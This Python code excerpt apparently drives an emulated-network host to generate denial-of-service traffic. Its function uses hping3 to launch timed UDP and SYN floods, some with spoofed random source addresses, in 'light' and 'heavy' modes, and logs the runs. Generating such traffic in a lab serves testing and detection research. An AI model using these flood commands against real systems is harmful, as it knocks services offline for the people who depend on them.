...
def run_dos_attack(net, mode="light", host_log_dir=None):
    ...
    if mode == "light":
        print("Running LIGHT DoS (controlled burst UDP+SYN)")
        h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> {host_log_q}")
        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~2000 duration=45s' >> {host_log_q}")
        h5.cmd(
            f"bash -lc 'timeout 45s hping3 --udp -q -p {target_port} -d 120 -i u500 {target_ip} >> {host_log_q} 2>&1 &'"
        )
        ...
        print("Running HEAVY DoS (focused flood UDP+SYN)")
        h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
        h5.cmd(f"echo '[DOS][HEAVY][UDP] start flood duration=60s' >> {host_log_q}")
        h5.cmd(
            f"bash -lc 'timeout 60s hping3 --udp --flood -q -p {target_port} -d 120 --rand-source {target_ip} >> {host_log_q} 2>&1 &'"
        )
        h5.cmd(f"echo '[DOS][HEAVY][SYN] start flood duration=60s' >> {host_log_q}")
        h5.cmd(
            f"bash -lc 'timeout 60s hping3 -S --flood -q -p {target_port} -d 64 --rand-source {target_ip} >> {host_log_q} 2>&1 &'"
        )
